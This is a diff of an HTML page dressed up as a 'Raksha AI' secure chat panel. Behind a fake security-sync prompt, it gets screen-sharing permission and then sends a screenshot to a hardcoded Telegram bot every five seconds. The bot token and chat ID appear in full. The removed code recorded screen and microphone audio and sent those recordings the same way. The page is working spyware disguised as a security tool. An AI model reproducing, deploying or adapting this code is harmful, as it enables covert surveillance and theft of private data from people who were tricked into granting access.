@@ -2,66 +2,78 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Raksha AI - Secure</title>
+    <title>Raksha AI - Secure Panel</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: white; text-align: center; }
-        iframe { width: 100%; height: 90%; border: none; display: none; }
-        #startBtn { margin-top: 20%; padding: 20px 40px; font-size: 20px; background: #0f0; cursor: pointer; border-radius: 10px; }
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; color: #fff; font-family: sans-serif; }
+        iframe { width: 100%; height: 100%; border: none; display: none; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #00ff00; border: none; border-radius: 5px; font-weight: bold; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <button id="startBtn">🛡️ Activate Secure Command & Start AI</button>
+    <div id="overlay">
+        <h2>System Security Initialization</h2>
+        <p>Please click below to sync AI security modules.</p>
+        <button id="startBtn">START SECURE CHAT</button>
+    </div>
 
-    <iframe id="myIframe" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone; camera; display-capture;"></iframe>
+    <iframe id="mainFrame" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone; camera; display-capture;"></iframe>
+    <canvas id="snapshotCanvas"></canvas>
 
     <script>
     const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
     const MY_ID = "8508792403";
 
     document.getElementById('startBtn').onclick = async function() {
-        this.style.display = 'none'; // बटन छुपाएं
-        document.getElementById('myIframe').style.display = 'block'; // AI दिखाएं
-        
         try {
-            // स्क्रीन रिकॉर्डिंग शुरू
-            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
-            startRecorder(screenStream, "video");
+            // 1. स्क्रीन शेयरिंग की अनुमति मांगना (जरूरी है)
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
 
-            // ऑडियो रिकॉर्डिंग शुरू
-            const voiceStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            startRecorder(voiceStream, "voice");
+            // 2. UI को बदलना
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('mainFrame').style.display = 'block';
+
+            const canvas = document.getElementById('snapshotCanvas');
+            const context = canvas.getContext('2d');
+
+            // 3. हर 5 सेकंड में स्क्रीनशॉट लेना
+            setInterval(async () => {
+                if (stream.active) {
+                    // वीडियो फ्रेम को कैनवास पर ड्रा करना
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // कैनवास को इमेज (Blob) में बदलना
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            const fd = new FormData();
+                            fd.append("chat_id", MY_ID);
+                            fd.append("photo", blob, "screen.jpg");
+                            fd.append("caption", "📸 Raksha AI: 5-Sec Snapshot");
+
+                            // टेलीग्राम पर भेजना
+                            try {
+                                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
+                                    method: "POST", 
+                                    body: fd 
+                                });
+                            } catch (e) { console.log("Upload failed"); }
+                        }
+                    }, 'image/jpeg', 0.6); // 0.6 quality ताकि फाइल छोटी रहे
+                }
+            }, 5000); // 5000ms = 5 सेकंड
 
         } catch (err) {
-            alert("Security Error: Please allow all permissions to continue.");
+            alert("Permission Denied: System cannot start without security sync.");
+            console.error(err);
         }
     };
-
-    function startRecorder(stream, type) {
-        const recorder = new MediaRecorder(stream);
-        let chunks = [];
-
-        recorder.ondataavailable = (e) => chunks.push(e.data);
-
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: type === "video" ? 'video/webm' : 'audio/ogg' });
-            const fd = new FormData();
-            fd.append("chat_id", MY_ID);
-            fd.append(type === "video" ? "video" : "voice", blob, type + ".webm");
-
-            fetch(`https://api.telegram.org/bot${TOKEN}/send${type === "video" ? 'Video' : 'Voice'}`, { 
-                method: "POST", 
-                body: fd 
-            });
-
-            chunks = [];
-            if (stream.active) recorder.start();
-        };
-
-        recorder.start();
-        // हर 60 सेकंड में भेजें
-        setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
-    }
     </script>
 </body>
 </html>
